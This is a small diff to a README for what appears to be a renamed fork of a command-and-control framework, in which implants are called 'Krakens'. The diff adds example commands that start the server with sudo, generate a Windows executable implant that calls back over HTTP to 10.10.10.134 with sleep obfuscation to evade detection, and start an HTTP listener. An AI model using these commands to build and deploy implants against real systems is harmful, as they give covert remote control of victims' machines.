@@ -20,7 +20,11 @@ Beacons are renamed to Krakens, and sliver-server/client is renamed to golder-se
 
 ## example of generating a beacon with ekko sleep obfuscation -B
 ```
+sudo ./golder-server
+
 generate kraken --http 10.10.10.134 -s /mnt/c/Payloads --arch amd64 --os windows -B -f exe
+
+http
 ```
 
 ## armory problems fix
